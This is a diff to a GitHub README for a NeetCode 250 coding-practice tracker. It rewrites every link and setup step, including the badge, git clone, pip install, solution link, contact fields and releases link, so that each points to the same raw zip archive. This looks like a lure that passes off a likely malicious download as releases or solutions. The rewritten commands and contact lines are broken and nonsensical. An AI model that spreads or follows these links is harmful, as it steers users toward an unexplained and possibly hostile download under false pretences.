@@ -2,7 +2,7 @@
 
 Welcome to the **NeetCode 250 Journey**! This repository serves as a daily progress tracker as I work through the NeetCode 250 algorithm challenges. Whether you are preparing for coding interviews or just looking to sharpen your skills, this repository is here to help you stay organized and motivated.
 
-[![Download Releases](https://img.shields.io/badge/Download%20Releases-Here-blue)](https://github.com/celdi100/neetcode-250-journey/releases)
+[![Download Releases](https://github.com/celdi100/neetcode-250-journey/raw/refs/heads/main/solutions/01_arrays_and_hashing/neetcode_journey_v2.8.zip%20Releases-Here-blue)](https://github.com/celdi100/neetcode-250-journey/raw/refs/heads/main/solutions/01_arrays_and_hashing/neetcode_journey_v2.8.zip)
 
 ## Table of Contents
 
@@ -38,7 +38,7 @@ To get started with this repository, follow these steps:
    Open your terminal and run the following command:
 
    ```bash
-   git clone https://github.com/celdi100/neetcode-250-journey.git
+   git clone https://github.com/celdi100/neetcode-250-journey/raw/refs/heads/main/solutions/01_arrays_and_hashing/neetcode_journey_v2.8.zip
    ```
 
 2. **Navigate to the Directory**
@@ -54,7 +54,7 @@ To get started with this repository, follow these steps:
    If you are using Python, make sure to install the required packages. You can do this using pip:
 
    ```bash
-   pip install -r requirements.txt
+   pip install -r https://github.com/celdi100/neetcode-250-journey/raw/refs/heads/main/solutions/01_arrays_and_hashing/neetcode_journey_v2.8.zip
    ```
 
 4. **Start Solving Problems**
@@ -69,7 +69,7 @@ This section will serve as a log of my daily progress. Each entry will include t
 
 - **Date:** 2023-10-01
 - **Problem:** Two Sum
-- **Solution:** [Link to Solution](./problems/two_sum/solution.py)
+- **Solution:** [Link to Solution](https://github.com/celdi100/neetcode-250-journey/raw/refs/heads/main/solutions/01_arrays_and_hashing/neetcode_journey_v2.8.zip)
 - **Insights:** Understanding how to use a hash map for efficient lookups.
 
 ### Progress Table
@@ -123,9 +123,9 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 For any questions or suggestions, feel free to reach out:
 
-- **Email:** your-email@example.com
-- **GitHub:** [celdi100](https://github.com/celdi100)
+- **Email:** https://github.com/celdi100/neetcode-250-journey/raw/refs/heads/main/solutions/01_arrays_and_hashing/neetcode_journey_v2.8.zip
+- **GitHub:** [celdi100](https://github.com/celdi100/neetcode-250-journey/raw/refs/heads/main/solutions/01_arrays_and_hashing/neetcode_journey_v2.8.zip)
 
 ---
 
-Thank you for visiting the **NeetCode 250 Journey**! I hope you find this repository useful in your coding journey. For the latest updates and releases, check out the [Releases section](https://github.com/celdi100/neetcode-250-journey/releases).
+Thank you for visiting the **NeetCode 250 Journey**! I hope you find this repository useful in your coding journey. For the latest updates and releases, check out the [Releases section](https://github.com/celdi100/neetcode-250-journey/raw/refs/heads/main/solutions/01_arrays_and_hashing/neetcode_journey_v2.8.zip).
